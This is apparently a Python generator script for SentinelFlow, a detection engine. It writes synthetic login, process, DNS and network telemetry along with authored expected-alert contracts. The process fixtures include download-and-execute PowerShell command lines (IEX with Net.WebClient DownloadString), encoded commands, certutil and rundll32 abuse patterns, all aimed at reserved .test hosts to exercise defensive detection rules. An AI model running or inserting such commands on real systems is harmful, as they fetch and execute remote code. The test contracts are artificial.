"""Deterministic, inert telemetry. Expected outcomes are authored, never inferred by the engine."""

import argparse
import csv
import hashlib
import io
import json
import shutil
import tempfile
from copy import deepcopy
from datetime import UTC, datetime, timedelta
from pathlib import Path
from typing import Any

ROOT = Path(__file__).resolve().parents[1]
DATA = ROOT / "test-data"
BASE = datetime(2026, 1, 15, 9, tzinfo=UTC)
SEED = "sentinelflow-20260115-v1"


def event(
    identifier: str,
    seconds: float,
    category: str,
    action: str,
    *,
    outcome: str = "success",
    **overrides: Any,
) -> dict[str, Any]:
    record: dict[str, Any] = {
        "event": {
            "id": identifier,
            "timestamp": (BASE + timedelta(seconds=seconds)).isoformat(),
            "source": "synthetic.telemetry",
            "category": category,
            "type": "start" if category == "process" else "info",
            "action": action,
            "outcome": outcome,
            "severity": "informational",
        },
        "host": {"name": "workstation-01", "ip": "10.10.1.10"},
        "user": {"name": "analyst01"},
        "source": {"ip": "10.10.20.15", "port": 51000},
        "destination": {"ip": None, "port": None},
        "process": {
            "name": None,
            "executable": None,
            "command_line": None,
            "pid": None,
            "parent": {"name": None, "executable": None, "pid": None},
        },
        "network": {"protocol": None},
        "dns": {"query": None},
        "file": {"path": None},
        "metadata": {
            "synthetic": True,
            "product": "windows" if category in {"process", "identity"} else "linux",
        },
    }
    for path, value in overrides.items():
        current = record
        parts = path.split("__")
        for part in parts[:-1]:
            current = current.setdefault(part, {})
        current[parts[-1]] = value
    if record["process"]["name"] and record["process"]["executable"] is None:
        record["process"]["executable"] = "C:\\Windows\\System32\\" + record["process"]["name"]
    parent = record["process"]["parent"]
    if parent["name"] and parent["executable"] is None:
        parent["executable"] = "C:\\Windows\\" + parent["name"]
    return record


def alert(rule_id: str, severity: str, count: int, branch: str = "default") -> dict[str, Any]:
    return {"rule_id": rule_id, "severity": severity, "event_count": count, "branch": branch}


def authentication(
    prefix: str, count: int, *, start: int = 0, **kwargs: Any
) -> list[dict[str, Any]]:
    return [
        event(
            f"{prefix}-{index:03}",
            start + index,
            "authentication",
            "login",
            outcome="failure",
            host__name="gateway-01",
            **kwargs,
        )
        for index in range(count)
    ]


def parser_expectations() -> None:
    def empty(raw: Any, identifier: str, second: int, source: str) -> dict[str, Any]:
        return {
            "event": {
                "id": identifier,
                "timestamp": f"2026-01-15T09:00:0{second}Z",
                "source": source,
                "category": "authentication",
                "type": "info",
                "action": "login",
                "outcome": "success",
                "severity": "informational",
            },
            "host": {"name": "gateway-01", "ip": None},
            "user": {"name": "operator01"},
            "source": {"ip": None, "port": None},
            "destination": {"ip": None, "port": None},
            "process": {
                "name": None,
                "executable": None,
                "command_line": None,
                "pid": None,
                "parent": {"name": None, "executable": None, "pid": None},
            },
            "network": {"protocol": None},
            "dns": {"query": None},
            "file": {"path": None},
            "raw_event": raw,
            "metadata": {},
        }

    def identity(raw: Any, parser: str) -> str:
        canonical = json.dumps(raw, sort_keys=True, separators=(",", ":"), ensure_ascii=True)
        return hashlib.sha256(f"{parser}:{canonical}".encode()).hexdigest()[:32]

    contracts = []
    nested = json.loads((DATA / "parsers" / "normalized.json").read_text())
    expected = []
    for record in nested:
        value = deepcopy(record)
        value["event"]["timestamp"] = value["event"]["timestamp"].replace("+00:00", "Z")
        value["raw_event"] = record
        expected.append(value)
    contracts.append({"path": "parsers/normalized.json", "format": "json", "expected": expected})
    jsonl = [
        json.loads(line)
        for line in (DATA / "authentication" / "normal_login.jsonl").read_text().splitlines()
    ]
    expected = []
    for record in jsonl:
        value = deepcopy(record)
        value["event"]["timestamp"] = value["event"]["timestamp"].replace("+00:00", "Z")
        value["raw_event"] = record
        expected.append(value)
    contracts.append(
        {"path": "authentication/normal_login.jsonl", "format": "jsonl", "expected": expected}
    )
    raw_csv = list(csv.DictReader(io.StringIO((DATA / "parsers" / "events.csv").read_text())))[0]
    value = empty(raw_csv, "csv-login", 0, "csv.fixture")
    value["source"] = {"ip": "192.0.2.10", "port": 51000}
    contracts.append({"path": "parsers/events.csv", "format": "csv", "expected": [value]})
    expected = []
    for index, line in enumerate((DATA / "parsers" / "auth.log").read_text().splitlines()):
        value = empty(
            line, identity(line, "syslog"), index, ["sshd", "sshd", "sshd", "auth", "passwd"][index]
        )
        value["event"]["action"] = [
            "login",
            "login",
            "logout",
            "account_lockout",
            "password_change",
        ][index]
        value["event"]["outcome"] = "failure" if index in {0, 3} else "success"
        if index in {0, 1, 3}:
            value["source"]["ip"] = "192.0.2.10"
        if index in {0, 1}:
            value["source"]["port"] = 51000 + index
        expected.append(value)
    contracts.append({"path": "parsers/auth.log", "format": "syslog", "expected": expected})
    expected = []
    raw_windows = json.loads((DATA / "parsers" / "windows_events.json").read_text())
    for index, raw in enumerate(raw_windows):
        source = raw["System"]["Provider"]["Name"]
        value = empty(raw, identity(raw, "windows"), index, source)
        value["host"]["name"] = "win-client-01"
        value["event"]["category"] = [
            "authentication",
            "process",
            "network",
            "network",
            "identity",
        ][index]
        value["event"]["action"] = [
            "login",
            "process_created",
            "dns_query",
            "connection",
            "account_created",
        ][index]
        value["event"]["outcome"] = ["failure", "success", "unknown", "success", "success"][index]
        value["metadata"] = {
            "product": "windows",
            "windows_event_id": [4625, 4688, 22, 3, 4720][index],
            "windows_record_id": index + 1,
            "group_name": None,
            "target_user": ["operator01", None, None, None, "operator05"][index],
            "privileged": False,
        }
        if index == 0:
            value["source"] = {"ip": "192.0.2.11", "port": 51000}
        if index == 1:
            value["event"]["type"] = "start"
            value["process"].update(
                {
                    "name": "cmd.exe",
                    "executable": "C:\\Windows\\cmd.exe",
                    "command_line": "cmd.exe /c echo hello",
                    "parent": {
                        "name": "explorer.exe",
                        "executable": "C:\\Windows\\explorer.exe",
                        "pid": None,
                    },
                }
            )
        if index == 2:
            value["dns"]["query"] = "portal.example.test"
            value["metadata"]["dns_metrics"] = {
                "max_label_length": 7,
                "max_label_entropy": 2.584963,
                "label_count": 3,
                "base_domain": "example.test",
            }
        if index == 3:
            value["source"] = {"ip": "10.10.1.10", "port": 51000}
            value["destination"] = {"ip": "198.51.100.20", "port": 443}
            value["network"]["protocol"] = "tcp"
        if index == 4:
            value["user"]["name"] = "svc_identity"
        expected.append(value)
    contracts.append(
        {"path": "parsers/windows_events.json", "format": "windows", "expected": expected}
    )
    (DATA / "expected-results" / "parser-contracts.json").write_text(
        json.dumps(contracts, indent=2) + "\n"
    )


def generate() -> list[dict[str, Any]]:
    registry: list[dict[str, Any]] = []
    scenarios: list[dict[str, Any]] = []

    def save(
        dataset_id: str,
        path: str,
        purpose: str,
        records: list[dict[str, Any]] | str,
        expected: list[dict[str, Any]],
        *,
        kind: str = "positive",
        log_format: str = "jsonl",
        count: int | None = None,
    ) -> None:
        destination = DATA / path
        destination.parent.mkdir(parents=True, exist_ok=True)
        if isinstance(records, str):
            text = records
            assert count is not None
            event_count = count
        else:
            text = (
                json.dumps(records, indent=2) + "\n"
                if log_format in ("json", "windows")
                else "".join(json.dumps(record, sort_keys=True) + "\n" for record in records)
            )
            event_count = len(records)
        destination.write_text(text, encoding="utf-8")
        descriptor = {
            "id": dataset_id,
            "path": path,
            "name": purpose,
            "format": log_format,
            "event_count": event_count,
            "expected": expected,
            "kind": kind,
            "synthetic": True,
            "source": f"SentinelFlow generator; seed {SEED}",
            "license": "MIT",
            "sha256": hashlib.sha256(text.encode()).hexdigest(),
        }
        registry.append(descriptor)
        scenarios.append(
            {
                "test_id": dataset_id,
                "name": purpose,
                "dataset_id": dataset_id,
                "kind": kind,
                "expected": expected,
            }
        )

    brute = authentication("auth-brute", 25)
    save(
        "auth-brute-force",
        "authentication/brute_force.jsonl",
        "Repeated failed login: 25 attempts, one source",
        brute,
        [alert("AUTH-001", "high", 25)],
    )
    failures = authentication("auth-failed", 3)
    save(
        "auth-normal-failures",
        "benign/normal_authentication.jsonl",
        "Three ordinary login errors remain below threshold",
        failures,
        [],
        kind="benign",
    )
    successful = [event(f"auth-success-{i}", i * 30, "authentication", "login") for i in range(8)]
    save(
        "auth-success",
        "authentication/normal_login.jsonl",
        "Successful employee logins",
        successful,
        [],
        kind="benign",
    )
    lifecycle = [
        event("auth-logout", 0, "authentication", "logout"),
        event("auth-password", 10, "authentication", "password_change"),
    ]
    save(
        "auth-lifecycle",
        "authentication/lifecycle.jsonl",
        "Logout and password change",
        lifecycle,
        [],
        kind="benign",
    )
    distributed = [
        event(
            f"auth-distributed-{i}",
            i,
            "authentication",
            "login",
            outcome="failure",
            source__ip=f"192.0.2.{1 + i % 6}",
            user__name=f"operator{i % 3:02}",
        )
        for i in range(12)
    ]
    save(
        "auth-distributed",
        "authentication/distributed_failures.jsonl",
        "Distributed low-volume failures; no per-source threshold",
        distributed,
        [],
        kind="boundary",
    )
    spray = authentication("auth-spray", 12)
    for i, row in enumerate(spray):
        row["user"]["name"] = f"operator{i:02}"
    save(
        "auth-multiple-users",
        "authentication/password_spray.jsonl",
        "One source targets multiple users",
        spray,
        [alert("AUTH-001", "high", 12)],
    )
    lockouts = [
        event(
            f"lockout-{i}",
            i * 20,
            "authentication",
            "account_lockout",
            outcome="failure",
            host__name="dc-01",
            user__name=f"operator{i:02}",
        )
        for i in range(4)
    ]
    save(
        "auth-lockout",
        "authentication/account_lockout.jsonl",
        "Four lockouts on one domain controller",
        lockouts,
        [alert("AUTH-002", "medium", 4)],
    )
    save(
        "auth-normal-lockout",
        "benign/normal_lockouts.jsonl",
        "Two isolated account lockouts",
        lockouts[:2],
        [],
        kind="benign",
    )
    below = authentication("below", 9)
    save(
        "auth-below-threshold",
        "authentication/below_threshold.jsonl",
        "Exactly one event below the brute-force threshold",
        below,
        [],
        kind="boundary",
    )
    boundary = authentication("boundary", 10)
    boundary[-1]["event"]["timestamp"] = (BASE + timedelta(seconds=300)).isoformat()
    save(
        "auth-window-boundary",
        "authentication/window_boundary.jsonl",
        "Inclusive 300-second event-time boundary",
        boundary,
        [alert("AUTH-001", "high", 10)],
        kind="boundary",
    )
    outside = deepcopy(boundary)
    outside[-1]["event"]["timestamp"] = (BASE + timedelta(seconds=300, microseconds=1)).isoformat()
    save(
        "auth-window-outside",
        "authentication/window_outside.jsonl",
        "One microsecond outside the inclusive window",
        outside,
        [],
        kind="boundary",
    )
    groups = authentication("group-a", 10, source__ip="192.0.2.11") + authentication(
        "group-b", 10, source__ip="192.0.2.12"
    )
    save(
        "auth-group-separation",
        "authentication/group_separation.jsonl",
        "Independent sources create independent evidence",
        groups,
        [alert("AUTH-001", "high", 10), alert("AUTH-001", "high", 10)],
        kind="regression",
    )
    save(
        "auth-duplicates",
        "authentication/duplicate_events.jsonl",
        "Repeated identical event IDs cannot inflate thresholds",
        brute + deepcopy(brute),
        [alert("AUTH-001", "high", 25)],
        kind="regression",
    )
    save(
        "auth-shuffled",
        "authentication/shuffled_events.jsonl",
        "A shuffled batch is evaluated chronologically",
        list(reversed(brute)),
        [alert("AUTH-001", "high", 25)],
        kind="regression",
    )
    suppressed = authentication("episode-one", 15) + authentication("episode-two", 10, start=609)
    save(
        "auth-suppression-boundary",
        "authentication/suppression_boundary.jsonl",
        "Suppression ends exactly 600 seconds after the first trigger",
        suppressed,
        [alert("AUTH-001", "high", 15), alert("AUTH-001", "high", 10)],
        kind="regression",
    )
    missing = authentication("missing", 10, source__ip=None)
    save(
        "auth-missing-source",
        "authentication/missing_source.jsonl",
        "Missing grouping entities are not merged into an unknown source",
        missing,
        [],
        kind="regression",
    )

    commands = [
        "powershell.exe -NoProfile -EncodedCommand VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA",
        "powershell.exe (New-Object Net.WebClient).DownloadString('https://updates.example.test/')",
        "powershell.exe IEX $inertExampleText",
        "powershell.exe Invoke-WebRequest https://updates.example.test/",
        "powershell.exe [Convert]::FromBase64String('SGVsbG8=')",
    ]
    powershell = [
        event(
            f"powershell-{i}",
            100 + i,
            "process",
            "powershell_execution",
            host__name="eng-ws-04",
            user__name="engineer01",
            process__name="powershell.exe",
            process__command_line=command,
            process__parent__name="explorer.exe",
        )
        for i, command in enumerate(commands)
    ]
    save(
        "powershell-indicators",
        "powershell/suspicious_powershell.jsonl",
        "Five suspicious PowerShell indicators; never executed",
        powershell,
        [alert("PROC-001", "high", 5)],
    )
    save(
        "powershell-encoded",
        "powershell/encoded_command.jsonl",
        "Inert encoded-command telemetry",
        powershell[:1],
        [alert("PROC-001", "high", 1)],
    )
    admin = [
        event(
            f"ps-admin-{i}",
            i * 10,
            "process",
            "powershell_execution",
            process__name="powershell.exe",
            process__command_line=f"powershell.exe {command}",
            process__parent__name="explorer.exe",
        )
        for i, command in enumerate(["Get-Process", "Get-Service", "Get-Date", "Write-Output 'ok'"])
    ]
    save(
        "powershell-admin",
        "benign/administrative_powershell.jsonl",
        "Routine unencoded PowerShell administration",
        admin,
        [],
        kind="benign",
    )
    save(
        "powershell-legitimate-download",
        "powershell/legitimate_installer.jsonl",
        "Legitimate download still flags the indicator; intent is not inferred",
        powershell[3:4],
        [alert("PROC-001", "high", 1)],
        kind="policy",
    )
    processes = [
        event(
            "process-office",
            200,
            "process",
            "process_created",
            host__name="finance-ws-02",
            user__name="operator02",
            process__name="cmd.exe",
            process__command_line="cmd.exe /c echo example",
            process__parent__name="winword.exe",
        ),
        event(
            "process-certutil",
            201,
            "process",
            "process_created",
            host__name="finance-ws-02",
            user__name="operator02",
            process__name="certutil.exe",
            process__command_line="certutil.exe -urlcache https://files.example.test/sample.txt",
        ),
        event(
            "process-rundll32",
            202,
            "process",
            "process_created",
            host__name="finance-ws-02",
            user__name="operator02",
            process__name="rundll32.exe",
            process__command_line="rundll32.exe javascript: inert telemetry only",
        ),
    ]
    save(
        "process-suspicious",
        "process/suspicious_execution.jsonl",
        "Configurable process relationships and command-line patterns",
        processes,
        [alert("PROC-002", "high", 3)],
    )
    benign_processes = [
        event(
            "process-benign-cmd",
            0,
            "process",
            "process_created",
            process__name="cmd.exe",
            process__command_line="cmd.exe /c dir",
            process__parent__name="explorer.exe",
        ),
        event(
            "process-benign-script",
            10,
            "process",
            "script_execution",
            process__name="python.exe",
            process__command_line="python.exe inventory.py",
            process__parent__name="cmd.exe",
        ),
    ]
    save(
        "process-benign",
        "benign/normal_processes.jsonl",
        "Ordinary command prompt and script execution",
        benign_processes,
        [],
        kind="benign",
    )

    privilege = [
        event(
            f"privilege-{i}",
            300 + i,
            "identity",
            action,
            host__name="dc-02",
            user__name="operator03",
            metadata__group_name="Domain Admins",
            metadata__target_user="operator04",
        )
        for i, action in enumerate(["group_member_added", "group_member_removed"])
    ]
    save(
        "iam-privileged-group",
        "privilege-escalation/privileged_group.jsonl",
        "Add and remove a privileged group member",
        privilege,
        [alert("IAM-001", "high", 2)],
    )
    normal_group = deepcopy(privilege)
    for row in normal_group:
        row["metadata"]["group_name"] = "Helpdesk Readers"
    save(
        "iam-normal-group",
        "benign/normal_group_modification.jsonl",
        "Nonprivileged helpdesk group maintenance",
        normal_group,
        [],
        kind="benign",
    )
    approved = deepcopy(privilege)
    for row in approved:
        row["host"]["name"] = "id-admin-01"
        row["user"]["name"] = "svc_identity"
        row["metadata"]["change_ticket"] = "CHG-20260115"
    save(
        "iam-approved-maintenance",
        "benign/privileged_group_maintenance.jsonl",
        "Explicit service, host, and ticket maintenance exception",
        approved,
        [],
        kind="benign",
    )
    almost_approved = deepcopy(approved)
    for row in almost_approved:
        row["host"]["name"] = "unapproved-host"
    save(
        "iam-maintenance-wrong-host",
        "privilege-escalation/maintenance_wrong_host.jsonl",
        "A service name and ticket alone must not exempt another host",
        almost_approved,
        [alert("IAM-001", "high", 2)],
        kind="regression",
    )
    identity = [
        event("identity-create", 0, "identity", "account_created", metadata__privileged=True),
        event(
            "identity-escalate", 1, "identity", "privilege_escalation", metadata__privileged=True
        ),
    ]
    save(
        "iam-privilege-actions",
        "privilege-escalation/privileged_account.jsonl",
        "Privileged account creation and escalation",
        identity,
        [alert("IAM-001", "high", 2)],
    )
    service = [
        event(
            "service-create",
            0,
            "identity",
            "account_created",
            user__name="svc_identity",
            metadata__privileged=False,
        ),
        event("service-login", 1, "authentication", "login", user__name="svc_inventory"),
    ]
    save(
        "iam-service-activity",
        "privilege-escalation/service_account_activity.jsonl",
        "Nonprivileged account provisioning and service login",
        service,
        [],
        kind="benign",
    )

    def dns(prefix: str, queries: list[str], *, step: int = 1) -> list[dict[str, Any]]:
        return [
            event(
                f"{prefix}-{i}",
                400 + i * step,
                "network",
                "dns_query",
                host__name="resolver-client-01",
                source__ip="10.10.30.20",
                destination__ip="10.10.1.53",
                destination__port=53,
                network__protocol="udp",
                dns__query=query,
            )
            for i, query in enumerate(queries)
        ]

    normal_dns = dns("normal-dns", ["portal.example.test", "updates.example.test"] * 5, step=10)
    save(
        "dns-normal",
        "benign/normal_dns.jsonl",
        "Low-volume ordinary DNS names",
        normal_dns,
        [],
        kind="benign",
    )
    long_dns = dns("long-dns", [f"{'a' * 45}{i}.example.test" for i in range(3)])
    save(
        "dns-long-label",
        "dns/long_labels.jsonl",
        "Unusually long labels, not proof of tunneling",
        long_dns,
        [alert("DNS-001", "medium", 3, "long-label")],
    )
    entropy_dns = dns(
        "entropy-dns",
        [
            "abcdefghijklmnopqrstuvwxyz012345.example.test",
            "012345abcdefghijklmnopqrstuvwxyz.example.test",
            "zyxwvutsrqponmlkjihgfedcba543210.example.test",
        ],
    )
    save(
        "dns-entropy",
        "dns/high_entropy.jsonl",
        "Repeated high-entropy-looking labels",
        entropy_dns,
        [alert("DNS-001", "medium", 3, "high-entropy")],
    )
    frequency = dns("dns-frequency", ["updates.example.test"] * 25)
    save(
        "dns-frequency",
        "dns/high_frequency.jsonl",
        "25 queries in 25 seconds",
        frequency,
        [alert("DNS-001", "medium", 25, "query-frequency")],
    )
    subdomains = dns("dns-subdomains", [f"a{i}.b{i}.c{i}.x.example.test" for i in range(22)])
    save(
        "dns-subdomain-pattern",
        "dns/repeated_subdomains.jsonl",
        "Repeated unusual subdomains cross the configurable frequency threshold",
        subdomains,
        [alert("DNS-001", "medium", 22, "query-frequency")],
    )
    save(
        "dns-below-frequency",
        "benign/dns_below_threshold.jsonl",
        "19-query controlled burst, below the configured frequency threshold",
        frequency[:19],
        [],
        kind="boundary",
    )

    network = [
        event(
            f"net-unusual-{i}",
            500 + i * 10,
            "network",
            "connection",
            host__name="app-server-03",
            source__ip="10.10.40.21",
            destination__ip="203.0.113.77",
            destination__port=4444,
            network__protocol="tcp",
        )
        for i in range(6)
    ]
    save(
        "net-unusual",
        "network/unusual_ports.jsonl",
        "Repeated connections to an unusual port",
        network,
        [alert("NET-001", "medium", 6)],
    )
    normal_network = [
        event(
            f"net-normal-{i}",
            i * 10,
            "network",
            "http_request" if i % 2 else "connection",
            destination__ip="198.51.100.20",
            destination__port=443,
            network__protocol="tcp",
        )
        for i in range(8)
    ]
    save(
        "net-normal",
        "benign/normal_connections.jsonl",
        "Repeated normal HTTPS connections and requests",
        normal_network,
        [],
        kind="benign",
    )
    save(
        "net-below-threshold",
        "network/below_threshold.jsonl",
        "Two unusual-port events are below threshold",
        network[:2],
        [],
        kind="boundary",
    )
    allowed_network = deepcopy(network)
    for row in allowed_network:
        row["destination"]["ip"] = "203.0.113.10"
        row["destination"]["port"] = 9001
    save(
        "net-allowlisted",
        "benign/monitoring_connections.jsonl",
        "Explicit allowlisted monitoring destination",
        allowed_network,
        [],
        kind="benign",
    )
    private_network = deepcopy(network)
    for row in private_network:
        row["destination"]["ip"] = "172.20.0.4"
    save(
        "net-private",
        "benign/private_connections.jsonl",
        "Private service connections excluded by configured policy",
        private_network,
        [],
        kind="benign",
    )
    mixed_expected = [
        alert("AUTH-001", "high", 25),
        alert("AUTH-002", "medium", 4),
        alert("PROC-001", "high", 5),
        alert("PROC-002", "high", 3),
        alert("IAM-001", "high", 2),
        alert("DNS-001", "medium", 3, "long-label"),
        alert("NET-001", "medium", 6),
    ]
    mixed = brute + lockouts + powershell + processes + privilege + long_dns + network + successful
    mixed.sort(key=lambda row: (row["event"]["timestamp"], row["event"]["id"]))
    save(
        "mixed-incident",
        "mixed/incident_timeline.jsonl",
        "Seven detection families interleaved with successful logins",
        mixed,
        mixed_expected,
        kind="mixed",
    )
    noise = [
        event(
            f"baseline-{i:04}",
            i * 2,
            "authentication",
            "login",
            host__name=f"workstation-{i % 12:02}",
            source__ip=f"10.10.50.{1 + i % 40}",
            user__name=f"operator{i % 20:02}",
        )
        for i in range(1000)
    ]
    save(
        "benign-baseline",
        "benign/baseline_1000.jsonl",
        "1,000 successful logins for baseline and performance work",
        noise,
        [],
        kind="benign",
    )

    csv_stream = io.StringIO(newline="")
    columns = [
        "event.id",
        "event.timestamp",
        "event.source",
        "event.category",
        "event.type",
        "event.action",
        "event.outcome",
        "event.severity",
        "host.name",
        "user.name",
        "source.ip",
        "source.port",
        "destination.ip",
        "destination.port",
        "process.name",
        "process.command_line",
        "network.protocol",
        "dns.query",
        "file.path",
    ]
    writer = csv.DictWriter(csv_stream, fieldnames=columns, lineterminator="\n")
    writer.writeheader()
    writer.writerow(
        {
            "event.id": "csv-login",
            "event.timestamp": "2026-01-15T12:00:00+03:00",
            "event.source": "csv.fixture",
            "event.category": "authentication",
            "event.type": "info",
            "event.action": "login",
            "event.outcome": "success",
            "event.severity": "informational",
            "host.name": "gateway-01",
            "user.name": "operator01",
            "source.ip": "192.0.2.10",
            "source.port": 51000,
        }
    )
    save(
        "parser-csv",
        "parsers/events.csv",
        "Dotted-column CSV normalization contract",
        csv_stream.getvalue(),
        [],
        kind="parser",
        log_format="csv",
        count=1,
    )
    syslog = (
        "\n".join(
            [
                "Jan 15 09:00:00 gateway-01 sshd[120]: Failed password for operator01 from 192.0.2.10 port 51000 ssh2",
                "2026-01-15T12:00:01+03:00 gateway-01 sshd[120]: Accepted publickey for operator01 from 192.0.2.10 port 51001 ssh2",
                "Jan 15 09:00:02 gateway-01 sshd[120]: pam_unix(sshd:session): session closed for user operator01",
                "Jan 15 09:00:03 gateway-01 auth[121]: account operator01 locked from 192.0.2.10",
                "Jan 15 09:00:04 gateway-01 passwd[122]: password changed for operator01",
            ]
        )
        + "\n"
    )
    save(
        "parser-syslog",
        "parsers/auth.log",
        "Five supported authentication syslog messages",
        syslog,
        [],
        kind="parser",
        log_format="syslog",
        count=5,
    )
    windows = [
        {
            "System": {
                "EventID": code,
                "TimeCreated": {"SystemTime": f"2026-01-15T09:00:0{i}Z"},
                "Computer": "win-client-01",
                "Provider": {
                    "Name": "Microsoft-Windows-Sysmon"
                    if code in {1, 3, 22}
                    else "Microsoft-Windows-Security-Auditing"
                },
                "EventRecordID": i + 1,
            },
            "EventData": data,
        }
        for i, (code, data) in enumerate(
            [
                (
                    4625,
                    {"TargetUserName": "operator01", "IpAddress": "192.0.2.11", "IpPort": "51000"},
                ),
                (
                    4688,
                    {
                        "User": "operator01",
                        "NewProcessName": "C:\\Windows\\cmd.exe",
                        "CommandLine": "cmd.exe /c echo hello",
                        "ParentProcessName": "C:\\Windows\\explorer.exe",
                    },
                ),
                (22, {"User": "operator01", "QueryName": "portal.example.test"}),
                (
                    3,
                    {
                        "User": "operator01",
                        "SourceIp": "10.10.1.10",
                        "DestinationIp": "198.51.100.20",
                        "SourcePort": "51000",
                        "DestinationPort": "443",
                        "Protocol": "tcp",
                    },
                ),
                (4720, {"SubjectUserName": "svc_identity", "TargetUserName": "operator05"}),
            ]
        )
    ]
    save(
        "parser-windows",
        "parsers/windows_events.json",
        "Windows Security/Sysmon-style exported JSON, not EVTX",
        windows,
        [],
        kind="parser",
        log_format="windows",
    )
    save(
        "parser-json",
        "parsers/normalized.json",
        "Nested normalized JSON objects",
        successful[:2],
        [],
        kind="parser",
        log_format="json",
    )

    sigma_iex = [
        event(
            "sigma-iex-positive",
            0,
            "process",
            "process_created",
            process__name="powershell.exe",
            process__command_line="powershell.exe IEX (New-Object Net.WebClient).DownloadString('https://updates.example.test/example.txt')",
            process__parent__name="explorer.exe",
        )
    ]
    sigma_encoded = [
        event(
            "sigma-encoded-positive",
            0,
            "process",
            "process_created",
            process__name="powershell.exe",
            process__command_line="powershell.exe -enc VwByAGkAdABlAC0ATwB1AHQAcAB1AHQA",
            process__parent__name="explorer.exe",
        )
    ]
    sigma_neg = [
        event(
            "sigma-encoding-negative",
            0,
            "process",
            "process_created",
            process__name="powershell.exe",
            process__command_line="powershell.exe Get-Content sample.txt -Encoding UTF8",
            process__parent__name="explorer.exe",
        )
    ]
    for dataset_id, filename, rows, expected in [
        ("sigma-download", "download_iex.jsonl", sigma_iex, [alert("PROC-001", "high", 1)]),
        ("sigma-encoded", "encoded.jsonl", sigma_encoded, []),
        ("sigma-benign", "benign_encoding.jsonl", sigma_neg, []),
    ]:
        save(
            dataset_id,
            "sigma/" + filename,
            "Synthetic Sigma compatibility telemetry",
            rows,
            expected,
            kind="sigma",
        )

    azure = deepcopy(sigma_encoded)
    azure[0]["event"]["id"] = "sigma-azure-negative"
    azure[0]["process"]["parent"] = {
        "name": "gc_worker.exe",
        "executable": "C:\\Packages\\Plugins\\Microsoft.GuestConfiguration.ConfigurationforWindows\\gc_worker.exe",
        "pid": None,
    }
    save(
        "sigma-azure",
        "sigma/benign_azure.jsonl",
        "Upstream Azure parent-image exclusion",
        azure,
        [],
        kind="sigma",
    )
    benchmark = []
    for cycle in range(100):
        for source in mixed:
            row = deepcopy(source)
            row["event"]["id"] = f"bench-{cycle:03}-{source['event']['id']}"
            stamp = datetime.fromisoformat(source["event"]["timestamp"]) + timedelta(hours=cycle)
            row["event"]["timestamp"] = stamp.isoformat()
            benchmark.append(row)
    benchmark_text = "".join(json.dumps(row, separators=(",", ":")) + "\n" for row in benchmark)
    (DATA / "mixed" / "benchmark_5600.jsonl").write_text(benchmark_text)

    public_manifest = DATA / "public" / "manifest.json"
    if public_manifest.exists():
        registry.extend(json.loads(public_manifest.read_text()))
    DATA.mkdir(exist_ok=True)
    (DATA / "manifest.json").write_text(json.dumps(registry, indent=2) + "\n")
    expected_dir = DATA / "expected-results"
    expected_dir.mkdir(exist_ok=True)
    (expected_dir / "scenarios.json").write_text(json.dumps(scenarios, indent=2) + "\n")
    (expected_dir / "benchmark.json").write_text(
        json.dumps(
            {
                "file": "mixed/benchmark_5600.jsonl",
                "events": 5600,
                "alerts": 700,
                "rules_evaluated": 39200,
                "rule_alert_counts": {
                    "AUTH-001": 100,
                    "AUTH-002": 100,
                    "PROC-001": 100,
                    "PROC-002": 100,
                    "IAM-001": 100,
                    "DNS-001": 100,
                    "NET-001": 100,
                },
                "sha256": hashlib.sha256(benchmark_text.encode()).hexdigest(),
            },
            indent=2,
        )
        + "\n"
    )
    parser_expectations()
    lines = [
        "# Included telemetry manifest",
        "",
        f"Generator: `python scripts/generate_test_data.py`; fixed seed `{SEED}`.",
        "",
        "All generated telemetry is inert text and is never executed. Identities are invented;",
        "addresses are private/reserved and domains use `.test`. Expected results below are",
        "authored policy contracts, not learned from detector output. Counts are per isolated run",
        "with the seven bundled rules enabled. Duplicate input records do not increase evidence.",
        "",
        "| Dataset / path | Format | Input records | Expected alerts | Rules | Purpose / class | Source / license |",
        "|---|---|---:|---:|---|---|---|",
    ]
    for item in registry:
        rules = ", ".join(sorted({entry["rule_id"] for entry in item["expected"]})) or "none"
        lines.append(
            f"| `{item['path']}` | {item['format']} | {item['event_count']} | "
            f"{len(item['expected'])} | {rules} | {item['name']} / {item['kind']} | "
            f"{'Synthetic generator' if item['synthetic'] else item['source']} / {item['license']} |"
        )
    lines.extend(
        [
            "",
            "## Sigma fixtures",
            "",
            "| Path | Format | Events | Expected imported-rule alerts | Source / license |",
            "|---|---|---:|---|---|",
            "| `sigma/download_iex.jsonl` | JSONL | 1 | 1 high, upstream 85b0b087-eddf-4a2b-b033-d771fa2b9775 | Synthetic / MIT |",
            "| `sigma/encoded.jsonl` | JSONL | 1 | 1 medium, upstream fb843269-508c-4b76-8b8d-88679db22ce7 | Synthetic / MIT |",
            "| `sigma/benign_encoding.jsonl` | JSONL | 1 | 0 for both imported rules | Synthetic / MIT |",
            "",
            "Unmodified upstream Sigma rules and license notices live in `sigma/rules/` and",
            "`sigma/LICENSE.Detection.Rules.md`; pinned provenance is in `sigma/provenance.json`.",
            "",
            "## Policy, not enterprise false-positive measurement",
            "",
            "Legitimate download indicators deliberately still alert. The IAM maintenance exception",
            "requires `svc_identity` on `id-admin-01` with a `CHG-` numeric ticket; removing any part",
            "still alerts. These fields are untrusted telemetry, not authorization. Normal DNS bursts",
            "below 20 queries/minute are negative fixtures, not a universal baseline. Distributed",
            "low-rate login failures do not cross AUTH-001's **per-source** threshold. The controlled",
            "benign set cannot establish an enterprise false-positive rate.",
            "",
            "`expected-results/scenarios.json` is the machine-readable exact alert/severity/evidence",
            "contract. `manifest.json` includes SHA-256 digests and synthetic/source labels.",
            "",
            "## Additional validation inputs",
            "",
            "| Path | Format | Records / purpose | Expected result | Source / license |",
            "|---|---|---|---|---|",
            "| `mixed/benchmark_5600.jsonl` | JSONL | 5,600 events; 100 hourly incident cycles | "
            "700 alerts, 100 per bundled rule | Synthetic / MIT |",
            "| `sigma/benign_azure.jsonl` | JSONL | 1 event; full parent executable filter | "
            "0 imported encoded-rule alerts | Synthetic / MIT |",
            "| `security/overflow_number.json` | JSON | 1 malformed metadata object | "
            "Reject non-finite number | Synthetic / MIT |",
            "| `security/nonfinite.yaml` | YAML | 1 malformed metadata object | "
            "Reject non-finite number | Synthetic / MIT |",
            "| `security/sigma_dates.yml` | YAML | 1 metadata object | "
            "Preserve unquoted dates as strings | Synthetic / MIT |",
            "| `expected-results/parser-contracts.json` | JSON | Five parser contracts; "
            "21 expected normalized objects | Exact equality | Authored independently / MIT |",
            "| `expected-results/benchmark.json` | JSON | One authored benchmark contract | "
